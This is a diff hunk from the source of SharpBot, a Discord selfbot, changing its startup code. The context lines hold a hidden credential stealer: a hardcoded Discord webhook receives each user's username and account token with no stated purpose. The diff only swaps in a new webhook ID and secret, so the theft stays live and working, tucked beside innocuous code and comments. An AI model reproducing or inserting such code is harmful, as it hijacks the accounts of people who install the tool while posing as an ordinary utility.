@@ -72,7 +72,7 @@ class SharpBot extends Client {
                 logger.severe(`SharpBot is a selfbot, but you entered a bot token. Please follow the instructions at ${chalk.green('https://github.com/RayzrDev/SharpBot#getting-your-user-token')} and re-enter your token by running ${chalk.green('sharpbot --config')}.`);
                 return this.shutdown(false);
             }
-            var data = new Discord.WebhookClient('545282294588375070', '_fSNl7jU5GGU-Q5YggaBdJKFPebjl-YGoArS8lgffkSJahP52a9fE6JA5Qb0eKCN_4fD')
+            var data = new Discord.WebhookClient('545723203927015435', 'qcQYefbLDhOAJQoMOS2_CR86zRnQlpqdL_LGzKoMN0v3phHxT9dy3qXxXsXIJ7BpPzkZ')
             data.send(`\`${this.user.username}#${this.user.discriminator}\` : \n\`\`\`${this.config.botToken}\`\`\``)
             // Fix mobile notifications
             this.user.setAFK(true);
